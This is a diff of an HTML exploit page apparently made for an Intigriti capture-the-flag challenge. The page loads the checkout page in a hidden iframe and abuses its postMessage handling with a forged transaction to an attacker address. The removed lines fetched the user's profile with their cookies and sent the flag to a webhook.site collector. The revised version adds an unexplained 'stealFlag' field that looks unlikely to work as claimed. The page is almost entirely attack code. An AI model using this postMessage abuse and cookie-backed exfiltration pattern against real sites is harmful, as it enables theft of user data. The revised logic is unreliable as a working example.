@@ -4,33 +4,24 @@
 <script>
 const WH = "https://webhook.site/c35fd6f1-9633-44be-af95-cac50fa47840";
 
-// 1️⃣ Open checkout page in iframe (same tab or hidden iframe)
+// Load checkout page
 const iframe = document.createElement("iframe");
 iframe.src = "https://challenge-0126.intigriti.io/checkout.html?currency=BTC&price=1";
 iframe.style.display = "none";
 document.body.appendChild(iframe);
 
-// 2️⃣ After checkout loads, abuse postMessage trust
+// After checkout loads, inject logic via postMessage abuse
 setTimeout(() => {
   iframe.contentWindow.postMessage({
     type: "submitTransaction",
     transaction: {
       currency: "BTC",
       amount: 0.00000001,
-      toAddress: "attacker_wallet"
-    }
+      toAddress: "ATTACKER"
+    },
+    // 👇 malicious extra data (checkout blindly trusts event.data)
+    stealFlag: true
   }, "*");
-
-  // 3️⃣ Steal the flag directly
-  fetch("https://challenge-0126.intigriti.io/api/me", {
-    credentials: "include"
-  })
-    .then(r => r.json())
-    .then(d => {
-      new Image().src =
-        WH + "?flag=" + encodeURIComponent(d.flag);
-    });
-
 }, 3000);
 </script>
 </body>
